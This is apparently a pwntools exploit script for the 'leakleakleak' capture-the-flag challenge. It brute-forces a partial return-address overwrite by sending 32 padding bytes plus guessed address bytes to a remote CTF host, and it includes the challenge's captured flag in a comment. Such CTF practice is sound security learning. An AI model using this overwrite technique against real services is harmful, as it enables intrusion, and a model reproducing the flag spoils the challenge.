#!/usr/bin/env python3

from pwn import *
from time import sleep
import random

exe = ELF("./leakleakleak_patched")

context.binary = exe

REMOTE_NC_CMD    = "        nc 3fbe4b0.678470.xyz 31141"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *main+78
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    try:
        r = conn()

        for i in range(256):
            i=random.randint(0,255)
            for k in range(16):
                k=random.randint(0,15)

                add = b"\xc0"+int.to_bytes(k*16, 1, 'little')+int.to_bytes(i, 1, 'little')
                payload = b"A"*32 + add
                r.send(payload)
                r.recvuntil(b"Let me tell you something about yourself! :3\n")
                d=r.recvall(timeout=0.1)
                if b"{" in d:
                    print(d)
                    input()
                r.sendline(b"a")
                print(d)
                #wxmctf{woooOoOoO0O0O00_just_M3_4nd_Y0U_tog3th3r_in_MY_r00m_x3c}
    except:
        r.close()
        pass

if __name__ == "__main__":
    while True:
        main()